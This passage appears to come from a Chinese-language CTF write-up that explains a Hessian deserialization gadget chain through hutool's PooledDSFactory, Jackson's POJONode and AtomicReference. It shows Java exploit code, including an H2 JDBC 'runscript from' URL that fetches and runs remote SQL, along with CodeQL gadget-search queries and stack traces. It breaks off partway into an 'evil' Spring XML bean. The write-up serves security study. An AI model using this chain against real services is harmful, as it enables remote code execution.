class=\"string\">&quot;org.h2.Driver&quot;</span>);</span><br><span class=\"line\">DriverManager.getConnection(<span class=\"string\">&quot;jdbc:h2:mem:test;init=runscript from &#x27;http://localhost:7777/poc.sql&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure>\n<p>但是如果我们想要在getDataSource()的时候就已经触发getConnection 我们还需要多一个设置 initialSize</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">url</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;jdbc:h2:mem:test;init=runscript from &#x27;http://localhost:7777/poc.sql&#x27;&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">Setting</span> <span class=\"variable\">setting</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Setting</span>();</span><br><span class=\"line\">setting.set(<span class=\"string\">&quot;url&quot;</span>,url);</span><br><span class=\"line\">setting.put(<span class=\"string\">&quot;initialSize&quot;</span>, <span class=\"string\">&quot;1&quot;</span>);  <span class=\"comment\">// initialSize 为 1</span></span><br><span class=\"line\"><span class=\"type\">PooledDSFactory</span> <span class=\"variable\">pooledDSFactory</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">PooledDSFactory</span>(setting);</span><br><span class=\"line\">pooledDSFactory.getDataSource();</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"any-get-gadget\"><a href=\"#any-get-gadget\" class=\"headerlink\" title=\"any get gadget\"></a>any get gadget</h2><p>既然是 spring。首选肯定是jackson链。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">url</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;jdbc:h2:mem:test;init=runscript from &#x27;http://localhost:7777/poc.sql&#x27;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">Setting</span> <span class=\"variable\">setting</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Setting</span>();</span><br><span class=\"line\">setting.set(<span class=\"string\">&quot;url&quot;</span>,url);</span><br><span class=\"line\">setting.put(<span class=\"string\">&quot;initialSize&quot;</span>, <span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\"><span class=\"type\">PooledDSFactory</span> <span class=\"variable\">pooledDSFactory</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">PooledDSFactory</span>(setting);</span><br><span class=\"line\">pooledDSFactory.getDataSource().getConnection();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">ClassPool</span> <span class=\"variable\">classPool</span> <span class=\"operator\">=</span> ClassPool.getDefault();</span><br><span class=\"line\">ClassPool.getDefault().appendClassPath(<span class=\"keyword\">new</span> <span class=\"title class_\">LoaderClassPath</span>(Thread.currentThread().getContextClassLoader()));</span><br><span class=\"line\"><span class=\"type\">CtClass</span> <span class=\"variable\">ctClass</span> <span class=\"operator\">=</span> classPool.get(<span class=\"string\">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class=\"line\"><span class=\"type\">CtMethod</span> <span class=\"variable\">ctMethod</span> <span class=\"operator\">=</span> ctClass.getDeclaredMethod(<span class=\"string\">&quot;writeReplace&quot;</span>);</span><br><span class=\"line\">ctClass.removeMethod(ctMethod);</span><br><span class=\"line\">ctClass.toClass();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">POJONode</span> <span class=\"variable\">pojoNode</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">POJONode</span>(pooledDSFactory);</span><br><span class=\"line\">pojoNode.toString();</span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"toString-gadget\"><a href=\"#toString-gadget\" class=\"headerlink\" title=\"toString gadget\"></a>toString gadget</h2><p>知道source和sink之后其实我们就可以进行查询了。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"doctag\">@kind</span> path-problem</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> java</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.dataflow.FlowSources</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Source</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Method</span>&#123;</span><br><span class=\"line\">    Source()&#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.getDeclaringType().getASupertype*() <span class=\"keyword\">instanceof</span> TypeSerializable and</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.getName().matches(<span class=\"string\">&quot;put&quot;</span>) and</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.isPublic() and</span><br><span class=\"line\">        <span class=\"title function_\">getDeclaringType</span><span class=\"params\">()</span>.getQualifiedName().matches(<span class=\"string\">&quot;%hutool%&quot;</span>) and</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.getNumberOfParameters() = <span class=\"number\">2</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Sink</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Method</span>&#123;</span><br><span class=\"line\">    Sink()&#123;</span><br><span class=\"line\">        exists(MethodAccess ac|  </span><br><span class=\"line\">            ac.getMethod().getName().matches(<span class=\"string\">&quot;toString&quot;</span>)</span><br><span class=\"line\">            and</span><br><span class=\"line\">            ac.getMethod().getNumberOfParameters() = <span class=\"number\">0</span> <span class=\"comment\">// this.hasNoParameters()</span></span><br><span class=\"line\">            and</span><br><span class=\"line\">            <span class=\"title function_\">getDeclaringType</span><span class=\"params\">()</span>.getQualifiedName().matches(<span class=\"string\">&quot;%hutool%&quot;</span>)</span><br><span class=\"line\">            <span class=\"type\">and</span> </span><br><span class=\"line\">            <span class=\"variable\">this</span> <span class=\"operator\">=</span> ac.getCaller() </span><br><span class=\"line\">        ) and</span><br><span class=\"line\">        <span class=\"title function_\">getDeclaringType</span><span class=\"params\">()</span>.getASupertype*() <span class=\"keyword\">instanceof</span> TypeSerializable</span><br><span class=\"line\">        </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\">query predicate <span class=\"title function_\">edges</span><span class=\"params\">(Method a, Method b)</span> &#123; </span><br><span class=\"line\">    a.polyCalls(b)and</span><br><span class=\"line\">    (a.getDeclaringType().getASupertype*() <span class=\"keyword\">instanceof</span> TypeSerializable or a.isStatic()) and</span><br><span class=\"line\">    (b.getDeclaringType().getASupertype*() <span class=\"keyword\">instanceof</span> TypeSerializable or b.isStatic()) </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from Source source, Sink sink</span><br><span class=\"line\">where edges+(source, sink)</span><br><span class=\"line\">select source, source, sink, <span class=\"string\">&quot;$@ $@ to $@ $@&quot;</span> ,</span><br><span class=\"line\">source.getDeclaringType(),source.getDeclaringType().getName(),</span><br><span class=\"line\">source,source.getName(),</span><br><span class=\"line\">sink.getDeclaringType(),sink.getDeclaringType().getName(),</span><br><span class=\"line\">sink,sink.getName()</span><br></pre></td></tr></table></figure>\n\n<p>挑选一个。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213225124321.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213225124321.png\"  alt=\"image-20241213225124321\" lazyload></a></p>\n<p>我们现在的目标就是put到toString<br>然后就在hutools里面找找到了一个 JSONObject</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wrap:800, JSONUtil (cn.hutool.json)</span><br><span class=\"line\">set:393, JSONObject (cn.hutool.json)</span><br><span class=\"line\">set:352, JSONObject (cn.hutool.json)</span><br><span class=\"line\">put:340, JSONObject (cn.hutool.json)</span><br><span class=\"line\">put:32, JSONObject (cn.hutool.json)</span><br></pre></td></tr></table></figure>\n\n<p>但是是有要求的。而且必须是jdk原生类才行。<br><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241209172907925.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241209172907925.png\"  alt=\"image-20241209172907925\" lazyload></a></p>\n<h2 id=\"AtomicReference\"><a href=\"#AtomicReference\" class=\"headerlink\" title=\"AtomicReference\"></a>AtomicReference</h2><p>然后我们查找，发现有一个 。这个结果其实听过的，我过滤的这么严格，最后还能有700多个结果。过滤的不太严格的话电脑就直接卡死了。我感觉可以利用的应该挺多的。</p>\n<p>别忘了 dockerfile 里面还有一个这样的一个参数  <code>--add-opens java.base/java.util.concurrent.atomic=ALL-UNNAMED</code> 所以我们筛选原生类的时候也可以缩小一些范围。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"doctag\">@kind</span> path-problem</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> java</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.dataflow.FlowSources</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Source</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Method</span>&#123; </span><br><span class=\"line\">    Source()&#123;  <span class=\"comment\">// java.util.concurrent.atomic.AtomicReference</span></span><br><span class=\"line\">        <span class=\"built_in\">this</span>.getDeclaringType().getASupertype*() <span class=\"keyword\">instanceof</span> TypeSerializable and</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.getQualifiedName().matches(<span class=\"string\">&quot;java.util.concurrent.atomic.AtomicReference%&quot;</span>) and</span><br><span class=\"line\">        not <span class=\"built_in\">this</span>.getDeclaringType().getASupertype*() <span class=\"keyword\">instanceof</span> TypeNumber and</span><br><span class=\"line\">        not <span class=\"built_in\">this</span>.getQualifiedName().matches(<span class=\"string\">&quot;cn.hutool.json.JSON%&quot;</span>) and</span><br><span class=\"line\">        not <span class=\"built_in\">this</span>.getQualifiedName().matches(<span class=\"string\">&quot;java.lang.CharSequence%&quot;</span>) and</span><br><span class=\"line\">        not <span class=\"built_in\">this</span>.getQualifiedName().matches(<span class=\"string\">&quot;java.sql.SQLException%&quot;</span>) and</span><br><span class=\"line\">        not <span class=\"built_in\">this</span>.getQualifiedName().matches(<span class=\"string\">&quot;java.util.Map%&quot;</span>) and</span><br><span class=\"line\">        not <span class=\"built_in\">this</span>.getQualifiedName().matches(<span class=\"string\">&quot;java.util.Date%&quot;</span>) and</span><br><span class=\"line\">        not <span class=\"built_in\">this</span>.getQualifiedName().matches(<span class=\"string\">&quot;java.util.Calendar%&quot;</span>) and</span><br><span class=\"line\">        not <span class=\"built_in\">this</span>.getQualifiedName().matches(<span class=\"string\">&quot;java.time.temporal.TemporalAccessor%&quot;</span>) and</span><br><span class=\"line\">        not <span class=\"built_in\">this</span>.getQualifiedName().matches(<span class=\"string\">&quot;java.lang.Enum%&quot;</span>) and</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.getName().matches(<span class=\"string\">&quot;toString&quot;</span>) and</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.isPublic() and</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.getNumberOfParameters() = <span class=\"number\">0</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Sink</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Method</span>&#123;</span><br><span class=\"line\">    Sink()&#123;</span><br><span class=\"line\">        exists(MethodAccess ac|  </span><br><span class=\"line\">            ac.getMethod().getName().matches(<span class=\"string\">&quot;toString&quot;</span>)</span><br><span class=\"line\">            and</span><br><span class=\"line\">            ac.getMethod().getNumberOfParameters() = <span class=\"number\">0</span> <span class=\"comment\">// this.hasNoParameters()</span></span><br><span class=\"line\">            <span class=\"type\">and</span> </span><br><span class=\"line\">            <span class=\"variable\">this</span> <span class=\"operator\">=</span> ac.getCaller()</span><br><span class=\"line\">        ) and</span><br><span class=\"line\">        <span class=\"title function_\">getDeclaringType</span><span class=\"params\">()</span>.getASupertype*() <span class=\"keyword\">instanceof</span> TypeSerializable</span><br><span class=\"line\">        </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\">query predicate <span class=\"title function_\">edges</span><span class=\"params\">(Method a, Method b)</span> &#123; </span><br><span class=\"line\">    a.polyCalls(b)and</span><br><span class=\"line\">    (a.getDeclaringType().getASupertype*() <span class=\"keyword\">instanceof</span> TypeSerializable or a.isStatic()) and</span><br><span class=\"line\">    (b.getDeclaringType().getASupertype*() <span class=\"keyword\">instanceof</span> TypeSerializable or b.isStatic()) </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from Source source, Sink sink</span><br><span class=\"line\">where edges+(source, sink)</span><br><span class=\"line\">select source, source, sink, <span class=\"string\">&quot;$@ $@ to $@ $@&quot;</span> ,</span><br><span class=\"line\">source.getDeclaringType(),source.getDeclaringType().getName(),</span><br><span class=\"line\">source,source.getName(),</span><br><span class=\"line\">sink.getDeclaringType(),sink.getDeclaringType().getName(),</span><br><span class=\"line\">sink,sink.getName()</span><br></pre></td></tr></table></figure>\n\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241214002242218.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241214002242218.png\"  alt=\"image-20241214002242218\" lazyload></a></p>\n<p>AtomicReference  这个类的toString方法，会调用自身value属性的toString。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">url</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;jdbc:h2:mem:test;init=runscript from &#x27;http://localhost:7777/poc.sql&#x27;&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">Setting</span> <span class=\"variable\">setting</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Setting</span>();</span><br><span class=\"line\">setting.set(<span class=\"string\">&quot;url&quot;</span>,url);</span><br><span class=\"line\"><span class=\"type\">PooledDSFactory</span> <span class=\"variable\">pooledDSFactory</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">PooledDSFactory</span>(setting);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//  pooledDSFactory.getDataSource();</span></span><br><span class=\"line\"><span class=\"type\">ClassPool</span> <span class=\"variable\">classPool</span> <span class=\"operator\">=</span> ClassPool.getDefault();</span><br><span class=\"line\">ClassPool.getDefault().appendClassPath(<span class=\"keyword\">new</span> <span class=\"title class_\">LoaderClassPath</span>(Thread.currentThread().getContextClassLoader()));</span><br><span class=\"line\"><span class=\"type\">CtClass</span> <span class=\"variable\">ctClass</span> <span class=\"operator\">=</span> classPool.get(<span class=\"string\">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class=\"line\"><span class=\"type\">CtMethod</span> <span class=\"variable\">ctMethod</span> <span class=\"operator\">=</span> ctClass.getDeclaredMethod(<span class=\"string\">&quot;writeReplace&quot;</span>);</span><br><span class=\"line\">ctClass.removeMethod(ctMethod);</span><br><span class=\"line\">ctClass.toClass();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">POJONode</span> <span class=\"variable\">pojoNode</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">POJONode</span>(pooledDSFactory);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//   pojoNode.toString();</span></span><br><span class=\"line\"><span class=\"type\">Object</span> <span class=\"variable\">object</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">AtomicReference</span>&lt;&gt;(pojoNode);</span><br><span class=\"line\"><span class=\"comment\">//   object.toString();</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">JSONObject</span> <span class=\"variable\">jsonObject</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">JSONObject</span>();</span><br><span class=\"line\">jsonObject.put(<span class=\"string\">&quot;aaa&quot;</span>,object);</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"unsafe-allocateInstance\"><a href=\"#unsafe-allocateInstance\" class=\"headerlink\" title=\"unsafe.allocateInstance\"></a>unsafe.allocateInstance</h2><p>PooledDSFactory pooledDSFactory &#x3D; new PooledDSFactory(setting);</p>\n<p>这样实例化出来的 pooledDSFactory 是无法被序列化的。</p>\n<p>Unsafe中提供allocateInstance方法，仅通过Class对象就可以创建此类的实例对象，而且不需要调用其构造函数、初始化代码、JVM安全检查等</p>\n<h2 id=\"writeMapBegin\"><a href=\"#writeMapBegin\" class=\"headerlink\" title=\"writeMapBegin\"></a>writeMapBegin</h2><p>为什么要用这种方法将 JSONObject 写入进去。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hessian2Output.writeMapBegin(JSONObject.class.getName());</span><br><span class=\"line\">hessian2Output.writeObject(<span class=\"string\">&quot;whatever&quot;</span>);</span><br><span class=\"line\">hessian2Output.writeObject(object);</span><br><span class=\"line\">hessian2Output.writeMapEnd();</span><br><span class=\"line\">hessian2Output.close();</span><br></pre></td></tr></table></figure>\n\n<p>因为会提前触发put方法，导致 entries 的value没有值。上面那个其实就相当于构造一个map，然后kay和value分别是”whatever” 和 object。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">JSONObject</span> <span class=\"variable\">entries</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">JSONObject</span>();</span><br><span class=\"line\">entries.put(<span class=\"string\">&quot;aaa&quot;</span>,object);</span><br><span class=\"line\">hessian2Output.writeObject(entries);</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Bean\"><a href=\"#Bean\" class=\"headerlink\" title=\"Bean\"></a>Bean</h2><p>这个地方为什么要套上一层Bean</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Bean</span> <span class=\"variable\">bean</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Bean</span>();</span><br><span class=\"line\">bean.setData(SerializeUtil.serialize(pooledDSFactory));</span><br></pre></td></tr></table></figure>\n\n<p>问题就在于JavaDeserializer实例化PooledDSFactory的时候调用的是无参构造。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213175724894.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213175724894.png\"  alt=\"image-20241213175724894\" lazyload></a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">createDbSetting:87, GlobalDbConfig (cn.hutool.db)</span><br><span class=\"line\">&lt;init&gt;:50, AbstractDSFactory (cn.hutool.db.ds)</span><br><span class=\"line\">&lt;init&gt;:25, PooledDSFactory (cn.hutool.db.ds.pooled)</span><br><span class=\"line\">&lt;init&gt;:21, PooledDSFactory (cn.hutool.db.ds.pooled)</span><br><span class=\"line\">instantiate:313, JavaDeserializer (com.alibaba.com.caucho.hessian.io)</span><br><span class=\"line\">readObject:202, JavaDeserializer (com.alibaba.com.caucho.hessian.io)</span><br></pre></td></tr></table></figure>\n\n<p>若是无参构造，走到这里的时候会去加载配置文件。然后没有配置文件的话就会抛出异常报错。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213175938825.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213175938825.png\"  alt=\"image-20241213175938825\" lazyload></a></p>\n<h2 id=\"POJONode\"><a href=\"#POJONode\" class=\"headerlink\" title=\"POJONode\"></a>POJONode</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">getDataSource:62, DSFactory (cn.hutool.db.ds)</span><br><span class=\"line\">invoke:568, Method (java.lang.reflect)</span><br><span class=\"line\">serializeAsField:688, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)</span><br><span class=\"line\">serializeFields:772, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)</span><br><span class=\"line\">serialize:178, BeanSerializer (com.fasterxml.jackson.databind.ser)</span><br><span class=\"line\">serializeAsField:732, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)</span><br><span class=\"line\">serializeFields:772, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)</span><br><span class=\"line\">serialize:178, BeanSerializer (com.fasterxml.jackson.databind.ser)</span><br></pre></td></tr></table></figure>\n\n<p>看最后的那几步。</p>\n<p>套一层Bean和没有多套那一层Bean多了最后那重复的三步。其实就是多了一个递归调用。</p>\n<p>首先在这个地方找到value对应的Serializer，然后进行serialize。</p>\n<p>SerializerProvider.defaultSerializeValue()</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213215330708.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213215330708.png\"  alt=\"image-20241213215330708\" lazyload></a></p>\n<p>然后是获取对应的File。</p>\n<p>BeanSerializer.serialize()</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213215621613.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213215621613.png\"  alt=\"image-20241213215621613\" lazyload></a></p>\n<p>然后通过反射调用对应的get方法。然后get到对应的value。此时的value就已经是PooledDSFactory了。然后再进行一次这样的步骤，调用PooledDSFactory的任意get方法。</p>\n<p>BeanPropertyWriter.serializeAsField()</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213215902133.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213215902133.png\"  alt=\"image-20241213215902133\" lazyload></a></p>\n<h1 id=\"server\"><a href=\"#server\" class=\"headerlink\" title=\"server\"></a>server</h1><h2 id=\"sink\"><a href=\"#sink\" class=\"headerlink\" title=\"sink\"></a>sink</h2><p>poc.xml</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span>?&gt;</span>  </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">beans</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://www.springframework.org/schema/beans&quot;</span>  </span></span><br><span class=\"line\"><span class=\"tag\">       <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>  </span></span><br><span class=\"line\"><span class=\"tag\">       <span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span>  </span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;evil&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;java.lang.String&quot;</span>&gt;</span>  </span><br><span 